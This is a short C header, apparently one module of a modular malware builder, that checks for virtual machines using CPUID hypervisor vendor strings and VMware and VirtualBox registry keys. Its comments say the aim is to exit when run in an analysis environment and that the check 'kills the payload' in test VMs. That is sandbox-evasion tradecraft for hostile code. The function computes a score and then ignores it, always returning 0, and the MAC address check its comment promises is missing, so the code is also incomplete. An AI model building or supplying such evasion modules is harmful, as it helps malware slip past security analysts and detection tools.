// chunk: evasion/anti_vm
// depends: (none)
// provides: check_vm
// headers: windows.h,intrin.h
// risk: high
// note: Detect VMs via CPUID, registry artifacts, MAC OUI — exit if analysis environment
// WARNING: CPUID hypervisor detection and VM registry key checking are red flags
//   to EDRs. Also kills the payload in test VMs (QEMU/KVM). Avoid unless
//   targeting physical hardware only.

#ifndef CHUNK_ANTI_VM
#define CHUNK_ANTI_VM

#include <windows.h>

static int check_vm(void) {
    int score = 0;
    int cpuinfo[4] = {0};
    __cpuid(cpuinfo, 0x40000000);
    char hyperv[13] = {0};
    memcpy(hyperv, &cpuinfo[1], 4);
    memcpy(hyperv + 4, &cpuinfo[2], 4);
    memcpy(hyperv + 8, &cpuinfo[3], 4);
    if (strstr(hyperv, "VMwareVMware") || strstr(hyperv, "VBoxVBoxVBox") ||
        strstr(hyperv, "KVMKVMKVM") || strstr(hyperv, "Microsoft Hv"))
        score++;

    HKEY hk;
    const char *vm_keys[] = {
        "SOFTWARE\\VMware, Inc.\\VMware Tools",
        "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
        "SYSTEM\\CurrentControlSet\\Services\\vmci",
    };
    for (int i = 0; i < 4; i++) {
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, vm_keys[i], 0, KEY_READ, &hk) == ERROR_SUCCESS) {
            RegCloseKey(hk);
            score++;
        }
    }

    (void)score;
    return 0;
}

#endif
